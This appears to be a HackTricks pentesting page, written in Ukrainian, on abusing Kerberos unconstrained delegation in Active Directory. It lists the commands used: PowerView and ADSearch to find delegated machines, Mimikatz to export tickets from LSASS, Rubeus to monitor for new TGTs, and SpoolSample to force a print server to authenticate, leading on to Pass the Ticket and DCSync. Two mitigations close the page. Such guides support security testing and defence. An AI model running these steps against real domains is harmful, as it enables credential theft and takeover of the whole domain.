# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Це функція, яку адміністратор домену може встановити для будь-якого **комп'ютера** в домені. Тоді, щоразу, коли **користувач входить** на комп'ютер, **копія TGT** цього користувача буде **надіслана всередині TGS**, наданого DC **і збережена в пам'яті в LSASS**. Отже, якщо у вас є привілеї адміністратора на машині, ви зможете **вивантажити квитки та видавати себе за користувачів** на будь-якій машині.

Отже, якщо адміністратор домену входить на комп'ютер з активованою функцією "Unconstrained Delegation", і у вас є локальні адміністративні привілеї на цій машині, ви зможете вивантажити квиток і видавати себе за адміністратора домену будь-де (підвищення привілеїв домену).

Ви можете **знайти об'єкти комп'ютерів з цим атрибутом**, перевіряючи, чи атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) містить [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Ви можете зробити це за допомогою LDAP-фільтра ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, що робить powerview:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs</code></pre>

Завантажте квиток адміністратора (або користувача-жертви) в пам'ять за допомогою **Mimikatz** або **Rubeus для** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Більше інформації: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Більше інформації про Unconstrained delegation в ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Якщо зловмисник зможе **зламати комп'ютер, дозволений для "Unconstrained Delegation"**, він може **обманути** **сервер друку**, щоб **автоматично увійти** на нього, **зберігаючи TGT** в пам'яті сервера.\
Тоді зловмисник зможе виконати **атаку Pass the Ticket, щоб видавати себе за** обліковий запис комп'ютера сервера друку.

Щоб змусити сервер друку увійти на будь-яку машину, ви можете використовувати [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Якщо TGT отримано від контролера домену, ви можете виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
[**Більше інформації про цю атаку на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Ось інші способи спробувати примусити аутентифікацію:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Зменшення ризиків

- Обмежте входи DA/Admin до конкретних служб
- Встановіть "Обліковий запис є чутливим і не може бути делегований" для привілейованих облікових записів.

{{#include ../../banners/hacktricks-training.md}}
